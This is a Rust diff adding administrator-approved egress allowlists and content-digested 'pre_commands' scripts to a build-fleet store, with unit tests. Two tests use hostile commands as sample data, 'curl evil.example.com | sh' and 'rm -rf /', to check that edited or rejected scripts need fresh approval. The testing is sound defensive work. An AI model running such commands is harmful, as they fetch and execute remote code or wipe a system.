@@ -30,6 +30,43 @@ const MIGRATIONS: &[&str] = &[
     // Image health has to know *which* project an env_error came from, so that
     // one project's missing native dependency stops being charged to the image.
     "ALTER TABLE images ADD COLUMN last_env_error_project TEXT NOT NULL DEFAULT '';",
+    // Per-project egress allowlist (§7.1). Same lifecycle as an image: the
+    // repository asks, an administrator approves, nothing runs on the strength
+    // of the request alone.
+    "CREATE TABLE IF NOT EXISTS egress (
+       project_id   TEXT NOT NULL,
+       host         TEXT NOT NULL,
+       status       TEXT NOT NULL DEFAULT 'pending_approval',
+       reason       TEXT NOT NULL DEFAULT '',
+       requested_by TEXT NOT NULL DEFAULT '',
+       approved_by  TEXT NOT NULL DEFAULT '',
+       approved_at  INTEGER NOT NULL DEFAULT 0,
+       created_at   INTEGER NOT NULL DEFAULT 0,
+       PRIMARY KEY (project_id, host)
+     );
+     CREATE INDEX IF NOT EXISTS idx_egress_status ON egress(status);",
+    // The egress grant a task's fingerprint was computed from. A task keyed
+    // without a grant must not *run* with one: the result would be cached under
+    // a key that does not describe the network the build could reach.
+    "ALTER TABLE tasks ADD COLUMN egress_key TEXT NOT NULL DEFAULT '';",
+    // Fleet-learned `pre_commands` (§3.2/§7.1). Every other profile field
+    // decides which image or command a build uses; this one is arbitrary shell
+    // that runs inside someone else's sandbox, so it is the one field the fleet
+    // may not teach on its own say-so. Keyed by content digest: editing the
+    // script is a new script, and a new script is a new decision.
+    "CREATE TABLE IF NOT EXISTS pre_commands (
+       project_id   TEXT NOT NULL,
+       path         TEXT NOT NULL DEFAULT '',
+       digest       TEXT NOT NULL,
+       commands     TEXT NOT NULL DEFAULT '',
+       status       TEXT NOT NULL DEFAULT 'pending_approval',
+       requested_by TEXT NOT NULL DEFAULT '',
+       approved_by  TEXT NOT NULL DEFAULT '',
+       approved_at  INTEGER NOT NULL DEFAULT 0,
+       created_at   INTEGER NOT NULL DEFAULT 0,
+       PRIMARY KEY (project_id, path, digest)
+     );
+     CREATE INDEX IF NOT EXISTS idx_pre_commands_status ON pre_commands(status);",
 ];
 
 const SCHEMA_VERSION: i64 = MIGRATIONS.len() as i64;
@@ -100,6 +137,10 @@ pub struct TaskRow {
     pub build_ms: i64,
     pub bytes_synced: i64,
     pub cache_hit: i64,
+    /// The approved egress hosts, comma-joined, as of submission. The result
+    /// this task produces is cached under a fingerprint that folded exactly
+    /// these in, so the build must not be handed any others.
+    pub egress_key: String,
 }
 
 impl TaskRow {
@@ -130,6 +171,7 @@ impl TaskRow {
             build_ms: r.get("build_ms")?,
             bytes_synced: r.get("bytes_synced")?,
             cache_hit: r.get("cache_hit")?,
+            egress_key: r.get("egress_key")?,
         })
     }
 
@@ -168,6 +210,36 @@ pub struct ProfileRow {
     pub success_count: i64,
     pub total_count: i64,
     pub updated_at: i64,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct EgressRow {
+    pub project_id: String,
+    pub host: String,
+    pub status: String,
+    pub reason: String,
+    pub requested_by: String,
+    pub approved_by: String,
+    pub approved_at: i64,
+    pub created_at: i64,
+}
+
+/// A fleet-learned `pre_commands` script awaiting, holding or denied approval.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct PreCommandsRow {
+    pub project_id: String,
+    pub path: String,
+    /// Content digest — the identity of this exact script.
+    pub digest: String,
+    /// The commands themselves, one per line, exactly as they would run. The
+    /// console shows these: approving a digest without reading the script would
+    /// be approving nothing at all.
+    pub commands: Vec<String>,
+    pub status: String,
+    pub requested_by: String,
+    pub approved_by: String,
+    pub approved_at: i64,
+    pub created_at: i64,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
@@ -396,11 +468,11 @@ impl Store {
             "INSERT INTO tasks (id, task_type, project_id, worktree_id, agent_session, fingerprint,
                 supersede_key, status, result_kind, command, image, log_ref, worker_id, attempt,
                 created_at, started_at, finished_at, error, superseded_by, result_json,
-                queue_ms, sync_ms, build_ms, bytes_synced, cache_hit)
+                queue_ms, sync_ms, build_ms, bytes_synced, cache_hit, egress_key)
              -- `image` is filled in by set_task_image once the task is placed;
              -- `command` must be bound here or the worker is handed an empty
              -- script and every task exits 0 having compiled nothing.
-             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,'',?9, '','','',0, ?10,0,0,'','','',0,0,0,?11,0)",
+             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,'',?9, '','','',0, ?10,0,0,'','','',0,0,0,?11,0,?12)",
             params![
                 row.id,
                 row.task_type,
@@ -413,6 +485,7 @@ impl Store {
                 row.command,
                 row.created_at,
                 row.bytes_synced,
+                row.egress_key,
             ],
         )?;
         conn.execute(
@@ -445,34 +518,61 @@ impl Store {
 
     /// Task-level cache (§5.1). Only terminal, cacheable results within the
     /// TTL qualify; infra failures and timeouts must never be replayed.
-    pub fn find_cached_result(&self, fingerprint: &str, ttl_secs: i64) -> Result<Option<TaskRow>> {
+    ///
+    /// `egress_key` is the grant the *asking* submission holds, matched against
+    /// the grant the cached build actually ran with (§7.1). The fingerprint
+    /// already folds the grant as it stood at that build's submission, but a
+    /// grant can change while a task waits in the queue, and then the build runs
+    /// with less than its key promises. Matching on what it ran with is what
+    /// stops a failure caused by a revocation being replayed after the host is
+    /// approved again.
+    pub fn find_cached_result(
+        &self,
+        fingerprint: &str,
+        egress_key: &str,
+        ttl_secs: i64,
+    ) -> Result<Option<TaskRow>> {
         let cutoff = now_ms() - ttl_secs * 1000;
         let conn = self.conn.lock();
         let row = conn
             .query_row(
                 "SELECT * FROM tasks
-                 WHERE fingerprint = ?1 AND status = 'done'
+                 WHERE fingerprint = ?1 AND egress_key = ?2 AND status = 'done'
                    AND result_kind IN ('success','compile_error')
-                   AND finished_at > ?2
+                   AND finished_at > ?3
                  ORDER BY finished_at DESC LIMIT 1",
-                params![fingerprint, cutoff],
+                params![fingerprint, egress_key, cutoff],
                 TaskRow::from_row,
             )
             .optional()?;
         Ok(row)
     }
 
+    /// Record the grant a task was actually dispatched with, so its result is
+    /// only ever served to a submission holding that same grant.
+    pub fn set_dispatched_egress(&self, id: &str, hosts: &[String]) -> Result<()> {
+        self.conn.lock().execute(
+            "UPDATE tasks SET egress_key = ?2 WHERE id = ?1",
+            params![id, hosts.join(",")],
+        )?;
+        Ok(())
+    }
+
     /// An in-flight task with the same fingerprint: subscribe instead of
     /// enqueuing a duplicate (§5.3).
-    pub fn find_active_by_fingerprint(&self, fingerprint: &str) -> Result<Option<TaskRow>> {
+    pub fn find_active_by_fingerprint(
+        &self,
+        fingerprint: &str,
+        egress_key: &str,
+    ) -> Result<Option<TaskRow>> {
         let conn = self.conn.lock();
         let row = conn
             .query_row(
                 "SELECT * FROM tasks
-                 WHERE fingerprint = ?1
+                 WHERE fingerprint = ?1 AND egress_key = ?2
                    AND status IN ('pending','syncing','queued','running','uploading')
                  ORDER BY created_at ASC LIMIT 1",
-                params![fingerprint],
+                params![fingerprint, egress_key],
                 TaskRow::from_row,
             )
             .optional()?;
@@ -900,6 +1000,254 @@ impl Store {
             params![id, status, message],
         )?;
         Ok(())
+    }
+
+    /// Record what a project's repository asked to reach (§7.1).
+    ///
+    /// Requesting is idempotent and never changes a decision already made: a
+    /// branch that keeps the line in its config must not walk an approval back
+    /// to pending, nor quietly revive one an administrator rejected.
+    /// Returns whether this created a row. A repeated request — the normal
+    /// case, since the config line stays in the repository — creates nothing
+    /// and so costs nothing against the queue cap.
+    pub fn request_egress(&self, project_id: &str, host: &str, by: &str) -> Result<bool> {
+        let n = self.conn.lock().execute(
+            "INSERT INTO egress (project_id, host, status, requested_by, created_at)
+             VALUES (?1, ?2, 'pending_approval', ?3, ?4)
+             ON CONFLICT(project_id, host) DO NOTHING",
+            params![project_id, host, by, now_secs()],
+        )?;
+        Ok(n > 0)
+    }
+
+    /// Hosts this project's builds may actually reach. Only ever called on the
+    /// dispatch path, so a revoked host stops working on the next task.
+    pub fn approved_egress(&self, project_id: &str) -> Result<Vec<String>> {
+        let conn = self.conn.lock();
+        let mut stmt = conn.prepare(
+            "SELECT host FROM egress
+             WHERE project_id = ?1 AND status = 'approved' AND approved_by != ''
+             ORDER BY host",
+        )?;
+        let rows = stmt.query_map(params![project_id], |r| r.get::<_, String>(0))?;
+        Ok(rows.filter_map(|r| r.ok()).collect())
+    }
+
+    /// Rows of any status this project already holds, for the flood cap.
+    pub fn egress_count(&self, project_id: &str) -> Result<i64> {
+        let conn = self.conn.lock();
+        Ok(conn.query_row(
+            "SELECT COUNT(*) FROM egress WHERE project_id = ?1",
+            params![project_id],
+            |r| r.get(0),
+        )?)
+    }
+
+    pub fn pending_egress(&self, project_id: &str) -> Result<Vec<String>> {
+        let conn = self.conn.lock();
+        let mut stmt = conn.prepare(
+            "SELECT host FROM egress
+             WHERE project_id = ?1 AND status = 'pending_approval' ORDER BY host",
+        )?;
+        let rows = stmt.query_map(params![project_id], |r| r.get::<_, String>(0))?;
+        Ok(rows.filter_map(|r| r.ok()).collect())
+    }
+
+    pub fn list_egress(&self, status: Option<&str>) -> Result<Vec<EgressRow>> {
+        let conn = self.conn.lock();
+        let (sql, bind): (String, Vec<String>) = match status {
+            Some(s) => (
+                "SELECT project_id, host, status, reason, requested_by, approved_by, approved_at, \
+                 created_at FROM egress WHERE status = ?1 ORDER BY created_at DESC"
+                    .into(),
+                vec![s.to_string()],
+            ),
+            None => (
+                "SELECT project_id, host, status, reason, requested_by, approved_by, approved_at, \
+                 created_at FROM egress ORDER BY created_at DESC"
+                    .into(),
+                vec![],
+            ),
+        };
+        let mut stmt = conn.prepare(&sql)?;
+        let map = |r: &rusqlite::Row| -> rusqlite::Result<EgressRow> {
+            Ok(EgressRow {
+                project_id: r.get(0)?,
+                host: r.get(1)?,
+                status: r.get(2)?,
+                reason: r.get(3)?,
+                requested_by: r.get(4)?,
+                approved_by: r.get(5)?,
+                approved_at: r.get(6)?,
+                created_at: r.get(7)?,
+            })
+        };
+        let rows = if bind.is_empty() {
+            stmt.query_map([], map)?.filter_map(|r| r.ok()).collect()
+        } else {
+            stmt.query_map(params![bind[0]], map)?.filter_map(|r| r.ok()).collect()
+        };
+        Ok(rows)
+    }
+
+    /// Approve or revoke one host for one project. Revoking sets `approved_by`
+    /// back to empty, so `approved_egress` stops returning it even though the
+    /// row stays for the audit trail.
+    pub fn set_egress_status(
+        &self,
+        project_id: &str,
+        host: &str,
+        status: &str,
+        admin: &str,
+    ) -> Result<usize> {
+        let approved = status == "approved";
+        Ok(self.conn.lock().execute(
+            "UPDATE egress SET status = ?3,
+                 approved_by = CASE WHEN ?4 THEN ?5 ELSE '' END,
+                 approved_at = CASE WHEN ?4 THEN ?6 ELSE 0 END
+             WHERE project_id = ?1 AND host = ?2",
+            params![project_id, host, status, approved, admin, now_secs()],
+        )?)
+    }
+
+    // ------------------------- fleet-learned pre_commands -------------------
+
+    /// The identity of a script is its content. Editing one line makes a
+    /// different script, which has to be decided on separately — otherwise an
+    /// approval granted for `sed -i …` would carry over to whatever replaced it.
+    pub fn pre_commands_digest(commands: &[String]) -> String {
+        blake3::hash(commands.join("\n").as_bytes()).to_hex()[..16].to_string()
+    }
+
+    /// Register a script an agent learned, for an administrator to decide on.
+    /// Like `request_egress`, re-asking never disturbs an existing decision.
+    pub fn request_pre_commands(
+        &self,
+        project_id: &str,
+        path: &str,
+        commands: &[String],
+        by: &str,
+    ) -> Result<bool> {
+        let n = self.conn.lock().execute(
+            "INSERT INTO pre_commands
+                 (project_id, path, digest, commands, status, requested_by, created_at)
+             VALUES (?1, ?2, ?3, ?4, 'pending_approval', ?5, ?6)
+             ON CONFLICT(project_id, path, digest) DO NOTHING",
+            params![
+                project_id,
+                path,
+                Self::pre_commands_digest(commands),
+                commands.join("\n"),
+                by,
+                now_secs()
+            ],
+        )?;
+        Ok(n > 0)
+    }
+
+    /// The script this project may teach other agents, if any.
+    ///
+    /// At most one is ever approved at a time: approving a new digest retires
+    /// the previous one, because two different scripts for one project is not a
+    /// state anything downstream could act on.
+    pub fn approved_pre_commands(&self, project_id: &str, path: &str) -> Result<Vec<String>> {
+        let conn = self.conn.lock();
+        let text: Option<String> = conn
+            .query_row(
+                "SELECT commands FROM pre_commands
+                 WHERE project_id = ?1 AND path = ?2 AND status = 'approved' AND approved_by != ''
+                 ORDER BY approved_at DESC LIMIT 1",
+                params![project_id, path],
+                |r| r.get(0),
+            )
+            .optional()?;
+        Ok(text
+            .filter(|t| !t.is_empty())
+            .map(|t| t.lines().map(str::to_string).collect())
+            .unwrap_or_default())
+    }
+
+    pub fn pending_pre_commands(&self, project_id: &str, path: &str) -> Result<bool> {
+        let conn = self.conn.lock();
+        let n: i64 = conn.query_row(
+            "SELECT COUNT(*) FROM pre_commands
+             WHERE project_id = ?1 AND path = ?2 AND status = 'pending_approval'",
+            params![project_id, path],
+            |r| r.get(0),
+        )?;
+        Ok(n > 0)
+    }
+
+    pub fn list_pre_commands(&self, status: Option<&str>) -> Result<Vec<PreCommandsRow>> {
+        let conn = self.conn.lock();
+        let (sql, bind): (String, Vec<String>) = match status {
+            Some(s) => (
+                "SELECT project_id, path, digest, commands, status, requested_by, approved_by, \
+                 approved_at, created_at FROM pre_commands WHERE status = ?1 \
+                 ORDER BY created_at DESC"
+                    .into(),
+                vec![s.to_string()],
+            ),
+            None => (
+                "SELECT project_id, path, digest, commands, status, requested_by, approved_by, \
+                 approved_at, created_at FROM pre_commands ORDER BY created_at DESC"
+                    .into(),
+                vec![],
+            ),
+        };
+        let mut stmt = conn.prepare(&sql)?;
+        let map = |r: &rusqlite::Row| -> rusqlite::Result<PreCommandsRow> {
+            let commands: String = r.get(3)?;
+            Ok(PreCommandsRow {
+                project_id: r.get(0)?,
+                path: r.get(1)?,
+                digest: r.get(2)?,
+                commands: commands.lines().map(str::to_string).collect(),
+                status: r.get(4)?,
+                requested_by: r.get(5)?,
+                approved_by: r.get(6)?,
+                approved_at: r.get(7)?,
+                created_at: r.get(8)?,
+            })
+        };
+        let rows = if bind.is_empty() {
+            stmt.query_map([], map)?.filter_map(|r| r.ok()).collect()
+        } else {
+            stmt.query_map(params![bind[0]], map)?.filter_map(|r| r.ok()).collect()
+        };
+        Ok(rows)
+    }
+
+    /// Approve or revoke one script. Approving retires whatever else was
+    /// approved for the same project and path, so there is never a question of
+    /// which script the fleet is handing out.
+    pub fn set_pre_commands_status(
+        &self,
+        project_id: &str,
+        path: &str,
+        digest: &str,
+        status: &str,
+        admin: &str,
+    ) -> Result<usize> {
+        let approved = status == "approved";
+        let mut conn = self.conn.lock();
+        let tx = conn.transaction()?;
+        if approved {
+            tx.execute(
+                "UPDATE pre_commands SET status = 'superseded', approved_by = '', approved_at = 0
+                 WHERE project_id = ?1 AND path = ?2 AND digest != ?3 AND status = 'approved'",
+                params![project_id, path, digest],
+            )?;
+        }
+        let n = tx.execute(
+            "UPDATE pre_commands SET status = ?4,
+                 approved_by = CASE WHEN ?5 THEN ?6 ELSE '' END,
+                 approved_at = CASE WHEN ?5 THEN ?7 ELSE 0 END
+             WHERE project_id = ?1 AND path = ?2 AND digest = ?3",
+            params![project_id, path, digest, status, approved, admin, now_secs()],
+        )?;
+        tx.commit()?;
+        Ok(n)
     }
 
     pub fn approve_image(&self, id: &str, admin: &str) -> Result<()> {
@@ -1736,6 +2084,177 @@ mod tests {
     }
 
     #[test]
+    fn an_egress_request_reaches_no_worker_until_it_is_approved() {
+        let s = store();
+        s.request_egress("p1", "*.internal.corp", "agent-1").unwrap();
+        assert!(s.approved_egress("p1").unwrap().is_empty(), "a request is not a grant");
+        assert_eq!(s.pending_egress("p1").unwrap(), vec!["*.internal.corp"]);
+
+        s.set_egress_status("p1", "*.internal.corp", "approved", "admin").unwrap();
+        assert_eq!(s.approved_egress("p1").unwrap(), vec!["*.internal.corp"]);
+        assert!(s.pending_egress("p1").unwrap().is_empty());
+    }
+
+    #[test]
+    fn a_result_is_only_served_to_a_submission_holding_the_grant_it_ran_with() {
+        // The window this closes: the grant was revoked while the task queued,
+        // so the build ran without it and failed; then the host was approved
+        // again. The fingerprint is the same on both sides — it folded the
+        // grant as of *submission* — and only what the build actually ran with
+        // tells the two apart.
+        let s = store();
+        let mut row = task("t1", "fp", "k", "s", "queued");
+        // Keyed with the grant, dispatched without it.
+        row.egress_key = String::new();
+        s.insert_task(&row, "{}", "{}", "").unwrap();
+        s.complete_task(
+            "t1",
+            "done",
+            &TaskResult { kind: "compile_error".into(), ..Default::default() },
+            "",
+            "",
+        )
+        .unwrap();
+
+        // The submission that still holds the grant must not get this.
+        assert!(s.find_cached_result("fp", "registry.corp", 3600).unwrap().is_none());
+        // A submission with no grant is asking for exactly what ran.
+        assert!(s.find_cached_result("fp", "", 3600).unwrap().is_some());
+    }
+
+    #[test]
+    fn dispatch_records_what_the_build_could_actually_reach() {
+        let s = store();
+        let mut row = task("t1", "fp", "k", "s", "queued");
+        row.egress_key = "a.example.com,b.example.com".into();
+        s.insert_task(&row, "{}", "{}", "").unwrap();
+        s.set_dispatched_egress("t1", &["a.example.com".to_string()]).unwrap();
+        assert_eq!(s.get_task("t1").unwrap().unwrap().egress_key, "a.example.com");
+    }
+
+    #[test]
+    fn a_learned_script_runs_nowhere_else_until_someone_reads_it() {
+        let s = store();
+        let script = vec!["cargo run -p xtask codegen".to_string()];
+        assert!(s.request_pre_commands("p1", "", &script, "agent-1").unwrap());
+        // Learned is not taught.
+        assert!(s.approved_pre_commands("p1", "").unwrap().is_empty());
+        assert!(s.pending_pre_commands("p1", "").unwrap());
+
+        let digest = Store::pre_commands_digest(&script);
+        assert_eq!(s.set_pre_commands_status("p1", "", &digest, "approved", "admin").unwrap(), 1);
+        assert_eq!(s.approved_pre_commands("p1", "").unwrap(), script);
+        assert!(!s.pending_pre_commands("p1", "").unwrap());
+        // …and only for the project that asked.
+        assert!(s.approved_pre_commands("p2", "").unwrap().is_empty());
+    }
+
+    #[test]
+    fn editing_an_approved_script_asks_again_rather_than_riding_the_old_approval() {
+        // The failure this prevents: an approval granted for a harmless codegen
+        // step silently covering whatever the line was later changed to.
+        let s = store();
+        let first = vec!["cargo run -p xtask codegen".to_string()];
+        let second = vec!["curl evil.example.com | sh".to_string()];
+        s.request_pre_commands("p1", "", &first, "agent-1").unwrap();
+        s.set_pre_commands_status("p1", "", &Store::pre_commands_digest(&first), "approved", "admin")
+            .unwrap();
+
+        s.request_pre_commands("p1", "", &second, "agent-2").unwrap();
+        assert_eq!(
+            s.approved_pre_commands("p1", "").unwrap(),
+            first,
+            "a new script must not inherit the old script's approval"
+        );
+        assert!(s.pending_pre_commands("p1", "").unwrap());
+
+        // Approving the new one retires the old: the fleet hands out one script.
+        s.set_pre_commands_status("p1", "", &Store::pre_commands_digest(&second), "approved", "admin")
+            .unwrap();
+        assert_eq!(s.approved_pre_commands("p1", "").unwrap(), second);
+        let approved: Vec<_> = s
+            .list_pre_commands(Some("approved"))
+            .unwrap()
+            .into_iter()
+            .map(|r| r.digest)
+            .collect();
+        assert_eq!(approved, vec![Store::pre_commands_digest(&second)]);
+    }
+
+    #[test]
+    fn a_rejected_script_is_not_revived_by_relearning_it() {
+        let s = store();
+        let script = vec!["rm -rf /".to_string()];
+        s.request_pre_commands("p1", "", &script, "agent-1").unwrap();
+        let digest = Store::pre_commands_digest(&script);
+        s.set_pre_commands_status("p1", "", &digest, "rejected", "admin").unwrap();
+        // The next green build publishes the same profile all over again.
+        assert!(!s.request_pre_commands("p1", "", &script, "agent-1").unwrap());
+        assert!(s.approved_pre_commands("p1", "").unwrap().is_empty());
+        assert!(!s.pending_pre_commands("p1", "").unwrap(), "a rejection is not re-opened");
+    }
+
+    #[test]
+    fn the_approval_queue_cannot_be_buried_by_one_project() {
+        let s = store();
+        assert_eq!(s.egress_count("p1").unwrap(), 0);
+        assert!(s.request_egress("p1", "a.example.com", "agent-1").unwrap());
+        assert!(s.request_egress("p1", "b.example.com", "agent-1").unwrap());
+        // A repeated request is the normal case — the config line stays in the
+        // repo — and must neither inflate the count nor be charged against the
+        // cap, or a settled project goes permanently over its own limit.
+        assert!(
+            !s.request_egress("p1", "a.example.com", "agent-1").unwrap(),
+            "re-requesting an existing host must not create a row"
+        );
+        assert_eq!(s.egress_count("p1").unwrap(), 2);
+        // Rejected rows still occupy the queue: they are a decision, and
+        // letting a flood push them out would be a way to re-ask forever.
+        s.set_egress_status("p1", "a.example.com", "rejected", "admin").unwrap();
+        assert_eq!(s.egress_count("p1").unwrap(), 2);
+        assert_eq!(s.egress_count("p2").unwrap(), 0);
+    }
+
+    #[test]
+    fn approval_is_scoped_to_one_project() {
+        // The whole point of per-project scope: one project's dependency source
+        // must not become another project's build script's outbound channel.
+        let s = store();
+        s.request_egress("p1", "registry.corp", "agent-1").unwrap();
+        s.set_egress_status("p1", "registry.corp", "approved", "admin").unwrap();
+        assert_eq!(s.approved_egress("p1").unwrap(), vec!["registry.corp"]);
+        assert!(s.approved_egress("p2").unwrap().is_empty());
+    }
+
+    #[test]
+    fn revoking_takes_the_host_away_from_the_next_task() {
+        let s = store();
+        s.request_egress("p1", "registry.corp", "agent-1").unwrap();
+        s.set_egress_status("p1", "registry.corp", "approved", "admin").unwrap();
+        s.set_egress_status("p1", "registry.corp", "rejected", "admin").unwrap();
+        assert!(s.approved_egress("p1").unwrap().is_empty());
+        // The row stays, so the audit trail still shows what was asked for.
+        assert_eq!(s.list_egress(Some("rejected")).unwrap().len(), 1);
+    }
+
+    #[test]
+    fn re_requesting_never_walks_a_decision_back() {
+        // The config line stays in the repo, so every check re-sends it. That
+        // must not reset an approval to pending, nor revive a rejected host.
+        let s = store();
+        s.request_egress("p1", "registry.corp", "agent-1").unwrap();
+        s.set_egress_status("p1", "registry.corp", "rejected", "admin").unwrap();
+        s.request_egress("p1", "registry.corp", "agent-1").unwrap();
+
+        assert!(s.approved_egress("p1").unwrap().is_empty());
+        assert!(s.pending_egress("p1").unwrap().is_empty(), "a rejection is not re-opened");
+
+        s.set_egress_status("p1", "registry.corp", "approved", "admin").unwrap();
+        s.request_egress("p1", "registry.corp", "agent-1").unwrap();
+        assert_eq!(s.approved_egress("p1").unwrap(), vec!["registry.corp"]);
+    }
+
+    #[test]
     fn schema_applies_and_is_idempotent() {
         let s = store();
         s.migrate().unwrap();
@@ -1772,14 +2291,14 @@ mod tests {
         s.complete_task("t1", "done", &TaskResult { kind: "infra_error".into(), ..Default::default() }, "", "")
             .unwrap();
         // Risk: replaying an infra failure would tell the agent its code is fine.
-        assert!(s.find_cached_result("fp", 3600).unwrap().is_none());
+        assert!(s.find_cached_result("fp", "", 3600).unwrap().is_none());
 
         s.insert_task(&task("t2", "fp", "k", "s", "queued"), "{}", "{}", "").unwrap();
         s.complete_task("t2", "done", &TaskResult { kind: "success".into(), ..Default::default() }, "", "")
             .unwrap();
-        assert!(s.find_cached_result("fp", 3600).unwrap().is_some());
+        assert!(s.find_cached_result("fp", "", 3600).unwrap().is_some());
         // TTL boundary: a zero-second TTL must never hit.
-        assert!(s.find_cached_result("fp", -1).unwrap().is_none());
+        assert!(s.find_cached_result("fp", "", -1).unwrap().is_none());
     }
 
     #[test]
@@ -1876,7 +2395,9 @@ mod tests {
             conn.execute_batch(include_str!("schema.sql")).unwrap();
             conn.execute_batch(
                 "ALTER TABLE images DROP COLUMN last_env_error_project;
-                 INSERT INTO images (id, digest) VALUES ('e1', 'd');",
+                 ALTER TABLE tasks DROP COLUMN egress_key;
+                 INSERT INTO images (id, digest) VALUES ('e1', 'd');
+                 INSERT INTO tasks (id, task_type, fingerprint) VALUES ('t1', 'check', 'fp1');",
             )
             .unwrap();
             conn.pragma_update(None, "user_version", 0i64).unwrap();
@@ -1886,6 +2407,10 @@ mod tests {
         // The pre-existing row survived, and the new column is usable.
         s.record_image_outcome("d", "env_error", "p1", false).unwrap();
         assert_eq!(s.get_image("e1").unwrap().unwrap().consecutive_env_errors, 1);
+        // A task that predates the egress feature reads back with an empty
+        // grant, which is what `with_egress` treats as "no grant" — so its
+        // cached result stays reachable across the upgrade.
+        assert_eq!(s.get_task("t1").unwrap().unwrap().egress_key, "");
         let _ = std::fs::remove_dir_all(&dir);
     }
 
